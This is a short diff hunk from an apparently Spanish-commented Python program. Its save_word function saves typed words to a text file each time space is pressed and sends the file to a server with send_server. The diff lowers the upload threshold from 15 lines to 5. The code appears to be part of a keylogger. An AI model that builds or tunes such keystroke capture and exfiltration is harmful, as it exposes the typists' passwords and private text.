@@ -59,7 +59,7 @@ def save_word(): #Crea un txt y va guardando palabras cada que se presione espac
     #print(palabra + "\n")
     line_count += 1
         
-    if line_count >= 15:
+    if line_count >= 5:
         send_server("block.txt")
         line_count = 0
     reset()  
